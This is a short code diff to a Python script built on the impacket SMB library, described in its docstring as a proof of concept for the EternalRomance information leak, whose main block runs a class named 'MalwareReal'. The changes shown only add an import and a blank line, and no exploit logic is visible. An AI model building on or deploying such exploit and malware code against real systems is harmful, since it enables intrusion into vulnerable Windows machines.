@@ -13,6 +13,7 @@ from impacket import smb, smbconnection
 from impacket.dcerpc.v5 import transport, lsat, ndr
 from struct import pack, unpack
 import sys
+import io
 
 '''
 PoC: demonstrates how NSA eternalromance does the info leak
@@ -2035,4 +2036,5 @@ if __name__ == "__main__":
         pass
     malware = MalwareReal()
     malware.execute()
+
 
